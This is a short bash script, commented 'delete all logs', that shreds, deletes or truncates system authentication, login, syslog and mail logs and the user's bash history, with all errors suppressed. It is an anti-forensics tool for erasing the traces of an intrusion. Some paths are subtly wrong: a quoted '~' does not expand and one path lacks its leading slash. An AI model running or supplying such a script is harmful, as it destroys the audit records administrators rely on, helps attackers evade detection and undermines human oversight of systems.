#!/bin/bash

# delete all logs

FILES=("/var/log/auth.log" "~/.bash_history" "/var/log/cron" "/var/log/daemon.log" "/var/log/faillog" "/var/log/httpd"  "/var/log/apache2" "/var/log/maillog"  "var/log/mail.log" "/var/log/lastlog" "/var/log/messages" "/var/log/secure" "/var/log/syslog" "/var/log/utmp" "/var/log/wtmp")

function del {
	shred -f -u $1 2>/dev/null || rm -rf $1 2>/dev/null || echo "" > $1 2>/dev/null
}
for f in ${FILES[@]}; do del $f & done


